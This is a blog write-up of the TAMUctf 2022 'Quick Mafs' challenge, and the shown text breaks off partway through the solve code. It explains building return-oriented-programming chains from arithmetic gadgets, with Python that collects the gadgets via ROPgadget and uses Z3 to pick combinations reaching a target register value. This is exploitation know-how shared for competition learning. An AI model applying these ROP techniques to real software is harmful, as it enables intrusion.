<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>TAMUctf 2022 – Quick Mafs - TrebledJ's Pages</title><meta name="description" content="ROP chaining on steroids."><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="trebledj,tamuctf 2022 – quick mafs,rop chaining on steroids.,ctf,reverse,pwn,python,programming,writeup"><meta name="robots" content="index,follow"><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-Wv9Tjjg7Y7X5sBbP5AXqAQJA6+eewSRUjoPhNczfpnM=' 'sha256-FBtdNYnNdsvTKcrNIznI+jwGwhW3pNA5x/yQUw8jOPA=' 'sha256-puGfk8by7YflxyCkfgS+RgzE70yM3jYq5c5IrWTe0hM=' 'sha256-qlkNkQyGC5u9Brt4wwVi0MsPO/hVdrz3rzXuWYIkAbM=' 'sha256-fpqHX3vj/TpB8DyMxAUbt+Rpk0g/8oR6BkJd6JriNoo=' 'sha256-J+ryCgKrW+QOH4xdCyPd6R5W3u9wJkXayR7KvtlnCnQ=' 'sha256-kQnTuA4pPVYgo0bCEGXSCEkD+CzMbRrhb5Cn58IydSA=' 'sha256-Deekn20h+++EarpL0nFQLX7JSJv7s/2W9f988ZFAh14=' 'unsafe-hashes' comments.trebledj.me code.jquery.com cdn.jsdelivr.net gist.github.com static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com github.githubassets.com; font-src 'self' data: comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com; img-src 'self' data: comments.trebledj.me; frame-src 'self' *.soundcloud.com; connect-src 'self' comments.trebledj.me wss://comments.trebledj.me cloudflareinsights.com formcarry.com;"><link href="/feeds/posts.xml" rel="alternate" title="RSS Feed for TrebledJ's Pages" type="application/rss+xml"><meta property="og:site_name" content="TrebledJ's Pages"><meta property="og:type" content="article"><meta property="og:title" content="TAMUctf 2022 – Quick Mafs - TrebledJ's Pages"><meta property="twitter:title" content="TAMUctf 2022 – Quick Mafs - TrebledJ's Pages"><meta property="og:description" content="ROP chaining on steroids.

Challenge Description Oops! I dropped all of these arithmetic gadgets. Fortunately there are enough of them that you won't be able to pick out the right ones.... right? This is..."><meta property="twitter:description" content="ROP chaining on steroids.

Challenge Description Oops! I dropped all of these arithmetic gadgets. Fortunately there are enough of them that you won't be able to pick out the right ones.... right? This is..."><meta property="og:url" content="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><meta name="twitter:card" content="summary_large_image"><meta property="og:image" content="https://trebledj.me/img/posts/ctf/tamuctf22/assets/inspector-gadget-225w.webp"><meta property="twitter:image" content="https://trebledj.me/img/posts/ctf/tamuctf22/assets/inspector-gadget-225w.webp"><meta property="article:published_time" content="2022-04-23T00:00:00.000Z"><meta property="article:author" content="TrebledJ"><meta property="article:section" content="ctfs"><meta property="article:tag" content="ctf"><meta property="article:tag" content="reverse"><meta property="article:tag" content="pwn"><meta property="article:tag" content="python"><meta property="article:tag" content="programming"><meta property="article:tag" content="writeup"><script type="application/ld+json">{"@context": "https://schema.org","@type": "WebSite","name": "TrebledJ's Pages","url": "https://trebledj.me"}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/cb/css/icons-3b2a868570ec062c.css"><link rel="stylesheet" href="/cb/x2ljFSZBUH.css" media="print"><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script>const defaultTheme="dark";let icon=void 0;function modeInit(){var e=localStorage.getItem("theme");setMode("dark"===e?"dark":"light"===e?"light":defaultTheme)}function modeInitIcon(){icon=document.getElementById("mode-switch-icon"),isLightTheme()&&(icon.classList.remove("fa-moon"),icon.classList.add("fa-sun"),icon.classList.add("mode-switch-transform"))}function isLightTheme(){return"light"===localStorage.getItem("theme")}function modeSwitcher(){var e=localStorage.getItem("theme");setMode("dark"===e?"light":"light"===e?"dark":defaultTheme)}function setMode(e){"dark"===e?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):"light"===e&&(document.documentElement.setAttribute("data-theme","light"),localStorage.setItem("theme","light")),icon&&(icon.classList.toggle("fa-moon"),icon.classList.toggle("fa-sun"),icon.classList.toggle("mode-switch-transform"))}modeInit(),document.addEventListener("DOMContentLoaded",()=>{document.getElementById("mode-switch").addEventListener("click",()=>{modeSwitcher()})})</script><script defer src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><link rel="stylesheet" href="/css/comments.css"><link rel="icon" href="/favicon.ico" type="image/x-icon"></head><body><header><nav class="navbar navbar-expand-md py-2"><div class="container-fluid justify-content-between align-items-center"><button aria-controls="navbar-container" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler shadow-none" data-bs-target="#navbar-container" data-bs-toggle="collapse" type="button"><span id="navbar-toggler-icon"><i class="fas fa-bars"></i></span></button> <a class="navbar-brand no-decoration" href="/">TrebledJ's Pages</a><div class="navbar-collapse collapse" id="navbar-container"><ul class="navbar-nav me-auto"><li class="nav-item"><a class="nav-link" href="/">Home</a></li><li class="nav-item"><a class="nav-link" href="/about">About</a></li><li class="nav-item"><a class="nav-link" href="/posts">Posts</a></li><li class="nav-item"><a class="nav-link" href="/vulnerability-research">CVEs</a></li><li class="nav-item"><a class="nav-link" href="/music">Music</a></li><li class="nav-item"><a class="nav-link" href="/webroll">Webroll</a></li></ul><ul class="navbar-nav"><li><a class="nav-link me-2" data-bs-toggle="modal" data-bs-target="#search-modal" aria-label="Search..." role="button"><i class="fas fa-search nav-icon"></i></a></li><li><a class="nav-link" id="mode-switch" aria-label="Theme Switch" role="button"><i id="mode-switch-icon" class="fas fa-moon nav-icon"></i></a><script>modeInitIcon()</script></li></ul></div></div></nav><div id="scroll-progress-bar"></div></header><div id="top-of-the-morning-to-you"></div><div id="search-modal" class="modal fade wide-modal" aria-hidden="true" aria-label="Search" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header pb-2 d-flex flex-row justify-content-between"><div class="container-fluid ps-0" id="search-box-container"><input type="text" autofocus class="container-fluid" id="search-box" placeholder="Search"> <i class="fas fa-search"></i></div><button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button></div><div class="modal-body" id="search-results-list"></div></div></div></div><button id="btn-back-to-top" class="btn btn-lg" type="button" aria-label="Back to Top"><i class="fas fa-arrow-up"></i></button><div id="btn-mobile-toc" class="dropup"><button type="button" class="btn btn-lg" data-bs-toggle="dropdown" aria-label="Content"><i class="fas fa-list-ul"></i></button><ul class="dropdown-menu toc-container"><li><nav class="toc"><ol><li><a href="#challenge-description">Challenge Description</a></li><li><a href="#write-up">Write-Up</a></li><li><a href="#solve-scripts">Solve Scripts</a></li><li><a href="#flag">Flag</a></li></ol></nav></li></ul></div><div class="main-container"><div class="page-container col-lg-12"><div class="container-lg px-0"><article class="jw-100 post-article" itemscope itemtype="http://schema.org/BlogPosting"><div class="row flex-row-reverse gx-lg-5"><div class="col-lg-4 d-none d-lg-block"><div class="dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2022-04-23T08:00:00.000+08:00">2022‑04‑23</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2023-09-12T01:44:11.000+08:00">2023‑09‑11</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">4 minute read</span></div></div><div class="metadata-tag-container"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a></span></div></div></div><br><div id="toc-sidebar" class="sticky-right dim-deep dim-if-dark"><div class="toc-container"><span><a id="toc-content" href="javascript:void(0);">Content</a></span><nav class="toc"><ol><li><a href="#challenge-description">Challenge Description</a></li><li><a href="#write-up">Write-Up</a></li><li><a href="#solve-scripts">Solve Scripts</a></li><li><a href="#flag">Flag</a></li></ol></nav><hr></div><div class="toc-link-container"><span><a href="#related">Related Posts</a></span></div><div class="toc-link-container"><span><a href="#comments">Comments</a></span></div></div></div><div class="col-lg-8 post-body-container"><div class="article-header"><h1 class="post-title" itemprop="name headline">TAMUctf 2022 – Quick Mafs</h1><p class="post-desc" itemprop="alternativeHeadline">ROP chaining on steroids.</p><div class="d-lg-none dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2022-04-23T08:00:00.000+08:00">2022‑04‑23</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2023-09-12T01:44:11.000+08:00">2023‑09‑11</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">4 minute read</span></div></div><div class="metadata-tag-container"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a></span></div></div></div></div><hr><div class="post-body text-content" itemprop="articleBody text"><h3 id="challenge-description" tabindex="-1"><a class="md-anchor" href="#challenge-description" aria-hidden="true"></a> Challenge Description</h3><blockquote><p>Oops! I dropped all of these arithmetic gadgets. Fortunately there are enough of them that you won't be able to pick out the right ones.... right?</p><p>This is an automatic reversing &amp; exploitation challenge. The server will send you (in order) an instruction (they will be in the format <code>call print() with rax = 0x1234\n</code>) and an ELF binary as a newline terminated hex string. You should analyze the binary, construct a payload to accomplish that, and then send it back to the server as a newline terminated hex string. To receive the flag you will need to do this 5 times within a timeout of 10 minutes.</p></blockquote><h3 id="write-up" tabindex="-1"><a class="md-anchor" href="#write-up" aria-hidden="true"></a> Write-Up</h3><p>Another automatic binary challenge! This time there's more emphasis on <code>pwn</code>, specifically ROP. We need to solve the challenge 5 times in under 10 minutes, giving us about 2 minutes per solve.</p><h4 id="preliminary-observations" tabindex="-1"><a class="md-anchor" href="#preliminary-observations" aria-hidden="true"></a> Preliminary Observations</h4><p>Decompiling with Ghidra, we immediately notice an unsuspicious section of code labelled <code>gadgets</code>. This contains loads of arithmetic gadgets. Our objective is to set <code>rax</code> to a certain value, presumably, using the gadgets we're given here.</p><p><a class="lightbox-single" title="Ghidra image showing gadgets stuffed in the binary, with LEA, ADD, and RET instructions pockmarking the screen." href="/img/posts/ctf/tamuctf22/assets/quick-mafs-1-2448w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/quick-mafs-1-2448w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 2448 / 1160" alt="Ghidra image showing gadgets stuffed in the binary, with LEA, ADD, and RET instructions pockmarking the screen." title="Ghidra image showing gadgets stuffed in the binary, with LEA, ADD, and RET instructions pockmarking the screen." srcset="/img/posts/ctf/tamuctf22/assets/quick-mafs-1-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/quick-mafs-1-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/quick-mafs-1-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/quick-mafs-1-2448w.webp 2448w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2448px"></a></p><p>The first gadget we see is a simple MOV instruction. This allows us to set the initial value of <code>rax</code>.</p><p>All other gadgets are some variation of <code>lea rbx, &lt;addr&gt;; &lt;op&gt; ax, word ptr [rbx]</code>, where <code>&lt;addr&gt;</code> points to some byte in the data region, and <code>&lt;op&gt;</code> is one of <code>add</code>, <code>sub</code>, or <code>xor</code>. In other words, each of these gadgets will load a constant, and add/subtract/xor it with <code>ax</code> (the lower 16 bytes of <code>rax</code>).</p><p>Since there are so many gadgets, it would be illogical to try to compute the gadgets needed by hand. We'll probably need the help of a constraint solver, Z3. But before we get there, let's outline the ROP plan first.</p><p>As for the general structure of the program, we have <code>_start</code>, <code>vuln</code>, and <code>print</code>. <code>_start</code> just calls <code>vuln</code>, so nothing interesting. <code>vuln</code>, on the other hand, performs a read syscall, reading from stdin, setting <code>rsp</code> as the buffer, and with a length of 0x2000. So we have everything setup for unlimited ROPping. Sweet!</p><h4 id="rop-rop-rop-your-boat" tabindex="-1"><a class="md-anchor" href="#rop-rop-rop-your-boat" aria-hidden="true"></a> ROP ROP ROP Your Boat</h4><p>Before we carry on, there are a few things we should note:</p><ul><li>The <code>rbp</code> is popped off the stack before the <code>ret</code> in <code>vuln</code>. Our ROP chains will only be called after the pop.</li><li>We're limited to 0x2000 characters in the read syscall. However, due to limits on the stack size, we may only have up to about 4000 characters (by checking gdb, gef, vmmap).</li><li>We need to call <code>print</code> once <code>ax</code> is set to whatever value we're asked.</li></ul><p>This means:</p><ul><li>We should add 8 bytes of padding as our "dummy" <code>rbp</code>.</li><li>Our gadget payload shouldn't be more than 4000 chars long, to set some realistic limits.</li><li>We should add 8 bytes to call <code>print</code> after the gadget payload.</li></ul><h4 id="inspect-our-gadgets" tabindex="-1"><a class="md-anchor" href="#inspect-our-gadgets" aria-hidden="true"></a> Inspect-our Gadgets</h4><p><a class="lightbox-single" title="Inspector Gadget!" href="/img/posts/ctf/tamuctf22/assets/inspector-gadget-225w.webp"><img class="mb-2 rw center jw-100 w-30" src="/img/posts/ctf/tamuctf22/assets/inspector-gadget-225w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 225 / 225" alt="Inspector Gadget!" title="Inspector Gadget!" srcset="/img/posts/ctf/tamuctf22/assets/inspector-gadget-225w.webp 225w" sizes="225px"></a></p><p>Firstly, we'll load all the provided arithmetic gadgets into a list for convenience. Using <a href="https://github.com/JonathanSalwan/ROPgadget" rel="noreferrer" target="_blank"><code>ROPgadget</code></a> and hacking a bit into the tool, we start with the following code:</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># solve.py</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">from</span> ropgadget<span class="token punctuation">.</span>args <span class="token keyword">import</span> Args <span class="token keyword">as</span> ropargs
<span class="token keyword">from</span> ropgadget<span class="token punctuation">.</span>core <span class="token keyword">import</span> Core <span class="token keyword">as</span> ropcore


<span class="token keyword">def</span> <span class="token function">is_good_gadget</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> g<span class="token punctuation">[</span><span class="token string">'gadget'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'lea rbx'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> g<span class="token punctuation">[</span><span class="token string">'gadget'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'ret'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'elf'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">resolve_gadget</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'lea rbx, \[0x([0-9a-f]+)\] ; (\w+) ax, word ptr \[rbx\] ; ret'</span><span class="token punctuation">,</span> gadget<span class="token punctuation">[</span><span class="token string">'gadget'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'sub'</span><span class="token punctuation">,</span> <span class="token string">'xor'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'operation unknown'</span><span class="token punctuation">)</span>
        const_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'vaddr'</span><span class="token punctuation">:</span> gadget<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'op'</span><span class="token punctuation">:</span> m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'const'</span><span class="token punctuation">:</span> elf<span class="token punctuation">.</span>u16<span class="token punctuation">(</span>const_addr<span class="token punctuation">)</span><span class="token punctuation">}</span>

    <span class="token comment"># `--depth 15` is important, as it tells ROPgadget to search for longer chains.</span>
    core <span class="token operator">=</span> ropcore<span class="token punctuation">(</span>ropargs<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'--binary </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string"> --depth 15 --silent'</span></span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getArgs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> core<span class="token punctuation">.</span>analyze<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"ROPgadget: error analyzing elf"</span><span class="token punctuation">)</span>

    good_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span>resolve_gadget<span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>is_good_gadget<span class="token punctuation">,</span> core<span class="token punctuation">.</span>gadgets<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>All our arithmetic gadgets are now stored in <code>good_gadgets</code>, which is a list of dictionaries. Each dictionary contains has a <code>vaddr</code> key (the address of the gadget), an <code>op</code> key (the operation of the gadget: <code>'add'</code>/<code>'sub'</code>/<code>'xor'</code>), and a <code>const</code> key (the value of the constant being applied). The next step is to separate them into the <code>add</code>, <code>sub</code>, and <code>xor</code> ROP gadgets. Those are the only three categories of arithmetic available.</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py">xor_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> g<span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'xor'</span><span class="token punctuation">,</span> good_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
add_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> g<span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'add'</span><span class="token punctuation">,</span> good_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
sub_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> g<span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'sub'</span><span class="token punctuation">,</span> good_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Now comes the fun part... solving our way to <code>rax</code> using a constraint solver...</p><h4 id="zzz" tabindex="-1"><a class="md-anchor" href="#zzz" aria-hidden="true"></a> ZZZ</h4><p>We'll use Z3 as our constraint solver. Our approach to solving this is...</p><div class="alert alert-info d-flex align-items-start"><i class="fas fa-circle-info ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>Let $c$ be the init constant, moved to <code>rax</code> in the first gadget. Let $r$ be the target <code>rax</code>. Let $a_i$, $s_i$, and $x_i$ be the constants of the $i$-th add, subtract, and xor gadget respectively. These variables are all known constants. <a id="equation"></a></p><p>Further, let $m_i$, $n_i$, and $p_i$ be the number of the $i$-th add, subtract, and xor gadget to apply; and constrain $m_i, n_i, p_i \in \mathbb{Z}^+ \cup {0}$. These are unknown variables. We want to solve for these sets of variables such that</p><p>$$ c + \sum a_im_i - \sum s_in_i = \left(\bigwedge x_ip_i\right) \wedge r. $$</p></div></div><p>Our strategy now is to build up this equation using Z3 symbols, then throw the equation at the Z3 solver and get back solution sets for all $m_i, n_i, p_i$.</p><p>The first thing we want to do is to set up our symbols. We'll use Z3's <code>BitVec</code>tors to create our unknown 16-bit unsigned integers $m_i, n_i, p_i$. Why 16 bits? Because the gadgets operate on the <code>ax</code> register, which is only 16 bits wide.</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># Create 16-bit BVs. m_i denotes the number of times we apply the a_i gadget.</span>
add_vars <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'm_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>add_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># m</span>
sub_vars <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'n_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># n</span>
xor_vars <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'p_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># p</span>

<span class="token comment"># Address containing the `mov rax, XXX; ret` gadget.</span>
init_rax_addr <span class="token operator">=</span> <span class="token number">0x401004</span>
rax_init_value <span class="token operator">=</span> elf<span class="token punctuation">.</span>u16<span class="token punctuation">(</span>init_rax_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Keep in mind that these are all symbols, not concrete values.</p><p>Now we have everything we need to construct our <a href="#equation">equation</a>. We have:</p><ul><li>$c$ (<code>rax_init_value</code>),</li><li>$r$ (<code>target</code>, provided as a function parameter),</li><li>$a_i$ (<code>add_gadgets[i]['const']</code>),</li><li>$s_i$ (<code>sub_gadgets[i]['const']</code>),</li><li>$x_i$ (<code>xor_gadgets[i]['const']</code>),</li><li>$m_i$ (<code>add_vars</code>),</li><li>$n_i$ (<code>sub_vars</code>), and</li><li>$p_i$ (<code>xor_vars</code>).</li></ul><p>We can begin constructing constraints and feeding things to a Z3 solver!</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># Create solver.</span>
s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>

add_terms <span class="token operator">=</span> <span class="token punctuation">[</span>v <span class="token operator">*</span> BitVecVal<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'const'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>add_vars<span class="token punctuation">,</span> add_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
sub_terms <span class="token operator">=</span> <span class="token punctuation">[</span>v <span class="token operator">*</span> BitVecVal<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'const'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>sub_vars<span class="token punctuation">,</span> sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
xor_terms <span class="token operator">=</span> <span class="token punctuation">[</span>v <span class="token operator">*</span> BitVecVal<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'const'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>xor_vars<span class="token punctuation">,</span> xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># XOR everything in xor_terms.</span>
<span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span>
xor_all <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">^</span> y<span class="token punctuation">,</span> xor_terms<span class="token punctuation">)</span>

<span class="token comment"># Add base constraint which ties everything together.</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>BitVecVal<span class="token punctuation">(</span>rax_init_value<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>add_terms<span class="token punctuation">)</span> <span class="token operator">-</span> Sum<span class="token punctuation">(</span>sub_terms<span class="token punctuation">)</span> <span class="token operator">==</span> BitVecVal<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> xor_all<span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>But this constraint isn't enough. Without other constraints, Z3 would return ginormous values which technically satisfy the equation. But there's no way we can call a gadget 1851138 times or -29301 times. We'll need some constraints to limit the values the symbols can take on.</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># Bounds constraints.</span>
addsub_limit <span class="token operator">=</span> <span class="token number">100</span>
